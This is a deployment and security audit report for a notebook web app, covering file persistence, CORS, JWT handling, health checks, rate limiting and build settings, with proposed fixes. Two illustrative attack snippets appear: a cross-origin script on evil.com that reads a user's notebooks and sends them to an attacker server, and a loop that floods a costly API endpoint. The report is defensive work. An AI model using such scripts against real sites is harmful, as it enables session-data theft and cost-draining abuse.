# Additional Critical Issues - Sweep #2

## 🚨 CRITICAL ISSUE #11: Uploaded Files NOT Persistent!

**Location:** `open_notebook/config.py` lines 3-12

```python
# ROOT DATA FOLDER
DATA_FOLDER = "./data"  # ← PROBLEM: Relative path to /app/data (EPHEMERAL!)

# UPLOADS FOLDER
UPLOADS_FOLDER = f"{DATA_FOLDER}/uploads"  # ← /app/data/uploads (LOST ON RESTART!)
```

**Problem:**
- Files upload to `/app/data/uploads`
- `/app` is inside container (ephemeral filesystem)
- Container restart → ALL uploaded files DELETED!
- User uploads PDF → processes successfully → container restarts → FILE GONE!

**Evidence:**
```python
# api/routers/sources.py line 71
file_path = generate_unique_filename(upload_file.filename, UPLOADS_FOLDER)
# Saves to /app/data/uploads/document.pdf ← EPHEMERAL!
```

**Real User Impact:**
```
Day 1:
User uploads important-research.pdf → Success!
User can download it → Works!

Day 2 (after deployment):
User tries to download important-research.pdf → 404 Not Found!
Database still has record, but file is GONE!
```

**Solution:**
```python
# Use environment variable with fallback
DATA_FOLDER = os.getenv("DATA_PATH", "./data")

# For Render deployment, set:
# DATA_PATH=/mydata

# Result:
UPLOADS_FOLDER = "/mydata/uploads"  # ← PERSISTENT!
```

---

## 🚨 CRITICAL ISSUE #12: Podcast Files NOT Persistent!

**Location:** `commands/podcast_commands.py` line 132

```python
output_dir = Path(f"{DATA_FOLDER}/podcasts/episodes/{input_data.episode_name}")
# Saves to /app/data/podcasts/... ← EPHEMERAL!
```

**Problem:**
- Generated podcast audio files stored in `/app/data/podcasts/`
- Container restart → ALL podcasts DELETED!
- User generates 30-minute podcast (takes 5+ minutes) → restart → GONE!

**Real User Impact:**
```
User: "Generate podcast from my research notes"
System: *Spends 10 minutes generating audio*
User: "Perfect! Let me listen..."
*Deployment happens*
User: "Where did my podcast go?!"
System: 404 Not Found
```

---

## 🚨 CRITICAL ISSUE #13: LangGraph Checkpoints NOT Persistent!

**Location:** `open_notebook/config.py` lines 6-9

```python
sqlite_folder = f"{DATA_FOLDER}/sqlite-db"
LANGGRAPH_CHECKPOINT_FILE = f"{sqlite_folder}/checkpoints.sqlite"
# Saves to /app/data/sqlite-db/checkpoints.sqlite ← EPHEMERAL!
```

**Problem:**
- LangGraph uses SQLite for checkpoints/state
- Container restart → ALL checkpoint history LOST!
- Long-running graph operations might fail on restart

---

## 🚨 CRITICAL ISSUE #14: CORS Wide Open (Security Risk!)

**Location:** `api/main.py` lines 94-100

```python
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],  # ← SECURITY RISK!
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)
```

**Problem:**
- Allows requests from ANY origin
- With `allow_credentials=True`, this enables CSRF attacks
- Malicious site can steal user sessions

**Attack Scenario:**
```html
<!-- Evil site: evil.com -->
<script>
  // User is logged into ephitup.onrender.com
  fetch('https://ephitup.onrender.com/api/notebooks', {
    credentials: 'include'  // ← Sends user's cookies!
  })
  .then(r => r.json())
  .then(data => {
    // Evil site now has user's private notebooks!
    sendToEvilServer(data);
  });
</script>
```

**Solution:**
```python
# Environment-based CORS
allowed_origins = os.getenv(
    "ALLOWED_ORIGINS",
    "https://ephitup.onrender.com,https://ephitup-2g8q.onrender.com"
).split(",")

app.add_middleware(
    CORSMiddleware,
    allow_origins=allowed_origins,  # ← Specific domains only!
    allow_credentials=True,
    allow_methods=["GET", "POST", "PUT", "DELETE", "PATCH"],
    allow_headers=["*"],
)
```

---

## 🚨 CRITICAL ISSUE #15: JWT Token Expires Too Quickly

**Location:** `api/security.py` line 42

```python
ACCESS_TOKEN_EXPIRE_MINUTES = int(os.environ.get("JWT_EXPIRES_MINUTES", "60"))
# Default: 60 minutes = 1 hour
```

**Problem:**
- Users logged out every hour
- Bad UX for research/writing sessions
- No refresh token mechanism

**Real User Impact:**
```
User: *Opens app, starts writing notes*
*1 hour passes*
User: *Tries to save note*
System: 401 Unauthorized - Please log in again
User: *Loses unsaved work* 😡
```

**Recommendations:**
- **Short-term:** Increase to 24 hours (1440 minutes)
- **Long-term:** Implement refresh tokens
- **Best:** Add "Remember me" option

```python
# Recommended default:
ACCESS_TOKEN_EXPIRE_MINUTES = int(os.environ.get("JWT_EXPIRES_MINUTES", "1440"))
# 24 hours = 1440 minutes
```

---

## 🚨 CRITICAL ISSUE #16: JWT Secret Not in Persistent Storage

**Location:** `api/security.py` lines 25-38

```python
def get_secret_key() -> str:
    global _SECRET_KEY
    if _SECRET_KEY:
        return _SECRET_KEY

    key = os.environ.get("JWT_SECRET", "")
    if not key:
        key = secrets.token_urlsafe(32)  # ← Generates random key!
        logger.warning("JWT_SECRET is not set. Generated ephemeral key...")
    _SECRET_KEY = key
    return _SECRET_KEY
```

**Problem:**
- If `JWT_SECRET` not set → generates random key
- Container restart → NEW random key
- All existing user sessions INVALIDATED!
- All users logged out after every deployment

**Current Setup (render.yaml):**
```yaml
- key: JWT_SECRET
  generateValue: true  # ← Render generates ONCE, persists ✅
```

**Status:** ✅ **FIXED** - Render handles this correctly
- Generates on first deploy
- Persists across restarts
- Same key every time

---

## 🚨 CRITICAL ISSUE #17: No Environment Detection

**Location:** `open_notebook/config.py`

**Problem:**
- Code doesn't detect if running on Render vs local
- Always uses `./data` regardless of environment
- No way to automatically use `/mydata` on Render

**Solution:**
```python
import os
from pathlib import Path

# Detect environment and set data folder accordingly
def get_data_folder() -> str:
    """
    Get data folder based on environment.
    
    Priority:
    1. DATA_PATH env var (explicit override)
    2. /mydata if it exists (Render persistent storage)
    3. ./data (local development fallback)
    """
    # Explicit override
    if env_path := os.getenv("DATA_PATH"):
        return env_path
    
    # Check if /mydata exists (Render deployment)
    render_path = Path("/mydata")
    if render_path.exists() and render_path.is_dir():
        return str(render_path)
    
    # Local development
    return "./data"

DATA_FOLDER = get_data_folder()
```

---

## 🚨 CRITICAL ISSUE #18: No Health Check Endpoint

**Current:** `healthCheckPath: /`

**Problem:**
- Health check only tests if frontend is up
- Doesn't verify:
  - Database is connected
  - API is responding
  - Migrations are complete
  - Worker is running

**Solution:** Add proper health endpoint

```python
# api/routers/health.py
@router.get("/health")
async def health_check():
    health = {
        "status": "healthy",
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "checks": {}
    }
    
    # Check database
    try:
        async with db_connection() as db:
            await db.query("SELECT 1")
        health["checks"]["database"] = "ok"
    except Exception as e:
        health["status"] = "unhealthy"
        health["checks"]["database"] = f"failed: {str(e)}"
    
    # Check migrations
    try:
        manager = AsyncMigrationManager()
        version = await manager.get_current_version()
        health["checks"]["migrations"] = f"version {version}"
    except Exception as e:
        health["status"] = "unhealthy"
        health["checks"]["migrations"] = f"failed: {str(e)}"
    
    status_code = 200 if health["status"] == "healthy" else 503
    return JSONResponse(content=health, status_code=status_code)
```

```yaml
# render.yaml
healthCheckPath: /api/health  # ← Better health check
```

---

## 🚨 CRITICAL ISSUE #19: No Rate Limiting

**Problem:**
- API has no rate limiting
- Open to abuse/DoS attacks
- Expensive AI operations (embeddings, transformations) can be spammed

**Attack Scenario:**
```javascript
// Malicious script
for (let i = 0; i < 10000; i++) {
  fetch('https://ephitup.onrender.com/api/sources', {
    method: 'POST',
    body: JSON.stringify({
      type: 'link',
      url: 'https://example.com',
      embed: true  // ← Expensive embedding operation!
    })
  });
}
// User's OpenAI API bill: $$$$$
```

**Solution:** Add slowapi middleware

```python
from slowapi import Limiter, _rate_limit_exceeded_handler
from slowapi.util import get_remote_address
from slowapi.errors import RateLimitExceeded

limiter = Limiter(key_func=get_remote_address)
app.state.limiter = limiter
app.add_exception_handler(RateLimitExceeded, _rate_limit_exceeded_handler)

# Apply to expensive endpoints
@router.post("/sources")
@limiter.limit("10/minute")  # ← 10 sources per minute max
async def create_source(...):
    ...
```

---

## 🚨 CRITICAL ISSUE #20: Frontend Build Not Optimized

**Location:** `Dockerfile.single` line 39

```dockerfile
RUN npm run build
```

**Problem:**
- No build-time optimization flags
- Larger bundle size
- Slower page loads

**Solution:**
```dockerfile
# Set Node.js production mode
ENV NODE_ENV=production

# Optimize build
RUN npm run build

# Additional optimizations
ENV NEXT_TELEMETRY_DISABLED=1
```

---

## 📋 Priority Fix List

### 🔴 **CRITICAL** (Data Loss Risk):
1. Fix DATA_FOLDER to use `/mydata` on Render
2. Add DATA_PATH environment variable
3. Test file persistence after deploy

### 🟠 **HIGH** (Security Risk):
4. Fix CORS to specific origins
5. Add rate limiting to expensive endpoints
6. Increase JWT expiry to 24 hours

### 🟡 **MEDIUM** (UX/Operations):
7. Add proper `/api/health` endpoint
8. Add environment detection logic
9. Optimize frontend build

### 🟢 **LOW** (Nice to Have):
10. Add refresh token mechanism
11. Add monitoring/metrics
12. Add request logging

---

## 🎯 Immediate Action Required

The **DATA_FOLDER** issue is the most critical - users will lose all uploaded files on every deployment!

**Quick Fix:**
```yaml
# render.yaml - Add this env var:
- key: DATA_PATH
  value: "/mydata"
```

```python
# config.py - Update to:
DATA_FOLDER = os.getenv("DATA_PATH", "./data")
```

This ensures:
- ✅ Database → `/mydata/mydatabase.db` (already persistent)
- ✅ Uploads → `/mydata/uploads` (NOW persistent!)
- ✅ Podcasts → `/mydata/podcasts` (NOW persistent!)
- ✅ Checkpoints → `/mydata/sqlite-db` (NOW persistent!)

